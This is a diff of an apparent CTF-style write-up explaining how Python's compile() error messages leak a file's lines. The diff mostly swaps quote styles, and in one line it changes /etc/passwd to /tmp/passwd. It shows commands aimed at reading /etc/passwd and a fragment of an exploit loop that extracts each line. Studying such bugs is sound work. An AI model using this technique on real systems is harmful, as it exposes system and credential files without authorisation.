@@ -17,7 +17,7 @@ So, onto the bug!
 
 ### Bug
 
-By running `compile("yield", "/etc/passwd", "exec")`, we are able to leak the first line of any file.
+By running `compile('yield', '/etc/passwd', 'exec')`, we are able to leak the first line of any file.
 
 While it is useful in many cases, often we want to see the whole file, right?
 
@@ -32,7 +32,7 @@ line 3
 line 4
 ```
 
-We will be able to read the first line with 0 `\n` like as above, but when we run `compile("\nyield", "/etc/passwd", "exec")`, it returns `line 2`!
+We will be able to read the first line with 0 `\n` like as above, but when we run `compile('\nyield', '/tmp/passwd', 'exec')`, it returns `line 2`!
 
 ### Exploit 
 
@@ -47,7 +47,7 @@ for i in range(0,100):
     line_number = '\n' * i
     payload = line_number + 'yield'
     try:
-        compile(payload, sys.argv[1], "exec")
+        compile(payload, sys.argv[1], 'exec')
     except SyntaxError, err:
         try:
             exc_info = sys.exc_info()
